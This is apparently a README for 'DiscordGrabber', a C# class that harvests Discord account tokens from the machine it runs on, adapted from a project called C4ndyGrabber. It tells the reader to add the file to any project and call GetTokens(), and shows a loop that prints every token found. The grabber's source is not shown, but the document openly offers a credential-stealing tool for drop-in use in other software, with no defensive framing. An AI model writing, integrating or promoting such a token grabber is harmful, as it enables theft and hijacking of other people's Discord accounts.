# DiscordGrabber

DiscordGrabber is a C# class that makes the collection of Discord Tokens really easy. I use this class for many of my projects.

The Original code is from Nyxonn ([C4ndyGrabber](https://github.com/Nyxonn/c4ndyGrabber)).</br>
I modified it for easier private use and implementation.

## Usage

Just add the DiscordGrabber.cs file in your Project and call:

```cs
DiscordGrabber.GetTokens();
```

### Example

This will output all found tokens in a console window:

```cs
foreach (string token in DiscordGrabber.GetTokens()) Console.WriteLine(token);
```
